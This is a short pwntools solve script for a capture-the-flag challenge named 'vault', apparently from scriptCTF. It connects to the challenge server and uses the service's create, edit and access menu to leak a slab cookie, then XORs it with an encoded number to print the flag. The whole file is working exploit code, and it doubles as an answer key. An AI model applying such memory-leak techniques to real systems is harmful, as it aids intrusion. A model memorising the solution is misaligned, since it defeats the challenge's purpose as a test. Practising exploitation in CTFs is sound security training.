from pwn import *

context.log_level = 'CRITICAL'
context.binary = binary = ELF('./vault', checksec=False)

#p = process()
p = remote('play.scriptsorcerers.xyz', 10067)

def create(idx):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'index: ', str(idx).encode())

def edit_vault(idx, data):
	assert len(data) <= 8
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'index: ', str(idx).encode())
	p.sendafter(b'vault? ', data)

def access(idx):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'index: ', str(idx).encode())
	p.recvuntil(b'stuff: ')
	return p.recvline()[:-1]

p.recvuntil(b'number: ')
encoded_flag = int(p.recvline()[:-1], 16)

create(0)
edit_vault(0, b'\x00\x00\x00\x00\x00\x00\x00\x00')
slab_cookie = u64(access(0).ljust(8, b'\x00'))
flag = f'scriptCTF{{{hex(slab_cookie ^ encoded_flag)}}}'
print(f'flag: {flag}', end='')
